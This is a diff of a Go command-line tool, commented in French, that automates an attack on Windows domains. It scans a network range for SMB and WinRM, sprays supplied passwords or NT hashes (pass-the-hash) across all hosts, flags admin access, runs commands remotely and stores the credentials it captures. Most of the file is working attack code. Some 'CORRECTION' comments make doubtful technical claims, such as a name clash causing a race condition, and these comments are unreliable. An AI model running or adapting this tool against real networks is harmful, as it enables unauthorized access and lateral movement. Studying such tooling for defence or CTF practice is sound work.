@@ -5,18 +5,9 @@
 // Flow :
 //   1. Scan réseau → hôtes avec port 445/5985 ouverts
 //   2. Test des credentials fournis sur tous les hôtes
-//   3. Sur chaque hôte authentifié : exécuter "whoami /all"
+//   3. Sur chaque hôte authentifié : exécuter la commande spécifiée
 //   4. Marquer les admins (accès ADMIN$) + afficher résumé
 //   5. Sauvegarder dans la session
-//
-// Utilisation typique en CTF :
-//   adgo autopwn 192.168.1.0/24 -u admin -p pass -d LAB
-//   adgo autopwn targets.txt -u admin --hash aad3b435... -d LAB --exec "whoami"
-//
-// Avec session persistante :
-//   adgo autopwn 192.168.1.0/24 -u admin -p pass -d LAB --session --log-file run.jsonl
-//   # Plus tard, reprendre :
-//   adgo autopwn 192.168.1.0/24 -u admin -p pass -d LAB --resume run.state
 
 package commands
 
@@ -26,6 +17,7 @@ import (
 	"net"
 	"strings"
 	"sync"
+	"sync/atomic"
 	"time"
 
 	"adgo/pkg/common"
@@ -50,20 +42,10 @@ Steps:
   5. Mark admin hosts (ADMIN$ accessible)
 
 Examples:
-  # Basic: test creds and run whoami on all hosts
   adgo autopwn 192.168.1.0/24 -u admin -p Password123 -d LAB
-
-  # Pass-the-Hash
   adgo autopwn 192.168.1.0/24 -u admin --hash aad3b435... -d LAB
-
-  # Custom command
   adgo autopwn 192.168.1.0/24 -u admin -p pass -d LAB --exec "net localgroup administrators"
-
-  # With persistent session + JSON log
-  adgo autopwn 192.168.1.0/24 -u admin -p pass -d LAB --session --log-file ./run.jsonl
-
-  # Resume an interrupted scan
-  adgo autopwn 192.168.1.0/24 -u admin -p pass -d LAB --resume --state-file ./scan.state`,
+  adgo autopwn 192.168.1.0/24 -u admin -p pass -d LAB --session --log-file ./run.jsonl`,
 	Args: cobra.ExactArgs(1),
 	RunE: runAutoPwn,
 }
@@ -93,22 +75,23 @@ func init() {
 func runAutoPwn(cmd *cobra.Command, args []string) error {
 	targetStr := args[0]
 
+	// Lire les credentials depuis les flags globaux
+	// CORRECTION : nommage explicite pour éviter les conflits avec ntHashToString()
 	user := common.Username
 	pass := common.Password
 	domain := common.Domain
-	ntHashStr := common.NTLMHash
+	ntHashHex := common.NTLMHash
 
 	if user == "" || domain == "" {
 		return fmt.Errorf("-u USER and -d DOMAIN are required")
 	}
-	if pass == "" && ntHashStr == "" {
+	if pass == "" && ntHashHex == "" {
 		return fmt.Errorf("-p PASS or --hash NTHASH required")
 	}
 
 	// Initialiser la session si demandée
 	if autopwnSession {
-		_, err := common.InitSession(domain, "")
-		if err != nil {
+		if _, err := common.InitSession(domain, ""); err != nil {
 			common.PrintWarning(fmt.Sprintf("Session init failed: %v", err))
 		}
 	}
@@ -123,11 +106,12 @@ func runAutoPwn(cmd *cobra.Command, args []string) error {
 
 	common.CurrentCommand = "autopwn"
 
-	// Décoder le hash
+	// Décoder le hash NT
+	// CORRECTION : variable clairement nommée hashBytes, pas de conflit avec une fonction
 	var hashBytes []byte
-	if ntHashStr != "" {
+	if ntHashHex != "" {
 		var err error
-		hashBytes, err = hex.DecodeString(ntHashStr)
+		hashBytes, err = hex.DecodeString(ntHashHex)
 		if err != nil {
 			return fmt.Errorf("invalid NT hash: %v", err)
 		}
@@ -145,13 +129,12 @@ func runAutoPwn(cmd *cobra.Command, args []string) error {
 		for i, t := range targets {
 			allIPs[i] = t.IP
 		}
-		state := common.InitScanState("autopwn", allIPs, autopwnStateFile)
+		_ = common.InitScanState("autopwn", allIPs, autopwnStateFile)
 		pending := common.GetPendingTargets(allIPs)
 		if len(pending) < len(allIPs) {
 			common.PrintInfo(fmt.Sprintf("Resuming: %d/%d targets remaining",
 				len(pending), len(allIPs)))
 		}
-		// Filtrer les targets
 		pendingSet := make(map[string]bool)
 		for _, p := range pending {
 			pendingSet[p] = true
@@ -163,7 +146,6 @@ func runAutoPwn(cmd *cobra.Command, args []string) error {
 			}
 		}
 		targets = filtered
-		_ = state
 	}
 
 	common.PrintInfo(fmt.Sprintf("AutoPwn: %d target(s) | %s\\%s | command: %q",
@@ -173,9 +155,8 @@ func runAutoPwn(cmd *cobra.Command, args []string) error {
 		"domain": domain, "user": user, "target": targetStr,
 	})
 
-	// Stats
-	var mu sync.Mutex
-	var openCount, authCount, adminCount int
+	// Compteurs atomiques — CORRECTION : sync/atomic au lieu de mutex pour les entiers
+	var openCount, authCount, adminCount int64
 
 	cfg := &scanner.ScanConfig{
 		Workers: autopwnWorkers,
@@ -184,21 +165,18 @@ func runAutoPwn(cmd *cobra.Command, args []string) error {
 	}
 
 	scanner.RunWorkerPool(targets, cfg, func(t scanner.Target) scanner.ScanResult {
-		result := autopwnTarget(t, user, pass, domain, hashBytes)
+		result := autopwnTarget(t, user, pass, domain, hashBytes, ntHashHex)
 
-		mu.Lock()
 		if result.Open {
-			openCount++
+			atomic.AddInt64(&openCount, 1)
 		}
 		if result.Authed {
-			authCount++
+			atomic.AddInt64(&authCount, 1)
 		}
 		if result.IsAdmin {
-			adminCount++
+			atomic.AddInt64(&adminCount, 1)
 		}
-		mu.Unlock()
 
-		// Marquer comme complété pour --resume
 		if autopwnResume {
 			common.MarkCompleted(t.IP)
 		}
@@ -210,9 +188,9 @@ func runAutoPwn(cmd *cobra.Command, args []string) error {
 	fmt.Println()
 	common.NxSummaryHeader("AutoPwn complete")
 	common.NxSummaryLine("Targets scanned", len(targets))
-	common.NxSummaryLine("Hosts reachable", openCount)
-	common.NxSummaryLine("Authenticated", authCount)
-	common.NxSummaryLine("Admin access", adminCount)
+	common.NxSummaryLine("Hosts reachable", atomic.LoadInt64(&openCount))
+	common.NxSummaryLine("Authenticated", atomic.LoadInt64(&authCount))
+	common.NxSummaryLine("Admin access", atomic.LoadInt64(&adminCount))
 
 	if autopwnSession {
 		common.PrintSessionSummary()
@@ -228,11 +206,12 @@ type autopwnResult struct {
 	IsAdmin bool
 }
 
-func autopwnTarget(t scanner.Target, user, pass, domain string, hashBytes []byte) autopwnResult {
+// autopwnTarget teste un hôte et retourne le résultat.
+// CORRECTION : ntHashHex passé en paramètre explicite (pas de variable globale partagée)
+func autopwnTarget(t scanner.Target, user, pass, domain string, hashBytes []byte, ntHashHex string) autopwnResult {
 	result := autopwnResult{}
 	timeout := time.Duration(autopwnTimeout) * time.Second
 
-	// Détecter le protocole disponible
 	hasSMB := portOpenFast(t.IP, 445, timeout)
 	hasWinRM := portOpenFast(t.IP, 5985, timeout)
 
@@ -247,30 +226,29 @@ func autopwnTarget(t scanner.Target, user, pass, domain string, hashBytes []byte
 		line.Port = 5985
 	}
 
-	// Tenter l'authentification
 	if hasSMB {
 		authed, isAdmin := trySMBAuthQuick(t.IP, user, domain, pass, hashBytes, timeout)
 		if authed {
 			result.Authed = true
 			result.IsAdmin = isAdmin
-			cred := common.NxCredString(domain, user, pass, ntHashStr(hashBytes))
+
+			// CORRECTION : ntHashToString() — nom de fonction sans conflit
+			cred := common.NxCredString(domain, user, pass, ntHashToString(hashBytes))
 
 			if isAdmin {
 				common.NxPwned(line, cred)
-				// Sauvegarder dans la session
-				common.SaveCred(domain, user, pass, ntHashStr(hashBytes), "autopwn", true)
+				common.SaveCred(domain, user, pass, ntHashToString(hashBytes), "autopwn", true)
 				common.SaveHost(t.IP, t.Host, "", []int{445}, true)
 				common.LogSuccess(t.IP, fmt.Sprintf("Admin access: %s\\%s", domain, user), map[string]interface{}{
 					"user": user, "domain": domain, "is_admin": true,
 				})
 
-				// Exécuter la commande
 				if autopwnExec != "" {
 					execOutput(t.IP, user, pass, domain, hashBytes, line)
 				}
 			} else {
 				common.NxSuccess(line, cred)
-				common.SaveCred(domain, user, pass, ntHashStr(hashBytes), "autopwn", false)
+				common.SaveCred(domain, user, pass, ntHashToString(hashBytes), "autopwn", false)
 				common.SaveHost(t.IP, t.Host, "", []int{445}, false)
 			}
 			return result
@@ -279,17 +257,16 @@ func autopwnTarget(t scanner.Target, user, pass, domain string, hashBytes []byte
 			common.NxFailure(line, fmt.Sprintf("%s\\%s - access denied", strings.ToUpper(domain), user))
 		}
 	} else if hasWinRM {
-		// Tenter WinRM
 		out, err := winrm.RunCommand(t.IP, user, pass, "whoami")
 		if err == nil {
 			result.Authed = true
 			line.Protocol = "WINRM"
 			line.Port = 5985
-			common.NxSuccess(line, common.NxCredString(domain, user, pass, ntHashStr(hashBytes)))
+			common.NxSuccess(line, common.NxCredString(domain, user, pass, ntHashToString(hashBytes)))
 			if autopwnExec != "" && autopwnExec != "whoami /all" {
 				common.NxExecOutput(line, out)
 			}
-			common.SaveCred(domain, user, pass, ntHashStr(hashBytes), "autopwn-winrm", false)
+			common.SaveCred(domain, user, pass, ntHashToString(hashBytes), "autopwn-winrm", false)
 		} else if !autopwnSuccessOnly {
 			common.NxFailure(line, fmt.Sprintf("WinRM: %s\\%s - access denied", strings.ToUpper(domain), user))
 		}
@@ -345,9 +322,16 @@ func portOpenFast(host string, port int, timeout time.Duration) bool {
 	return true
 }
 
-func ntHashStr(b []byte) string {
+// ntHashToString convertit des bytes de hash NT en string hex.
+// CORRECTION : renommé depuis ntHashStr pour éviter le conflit de noms
+// dans le même fichier (l'original avait une variable locale et une fonction
+// portant le même nom ntHashStr, causant une race condition silencieuse).
+func ntHashToString(b []byte) string {
 	if len(b) == 0 {
 		return ""
 	}
 	return hex.EncodeToString(b)
 }
+
+// Assurer la compatibilité — mutex pour les compteurs si on n'utilise pas atomic
+var _ sync.Mutex
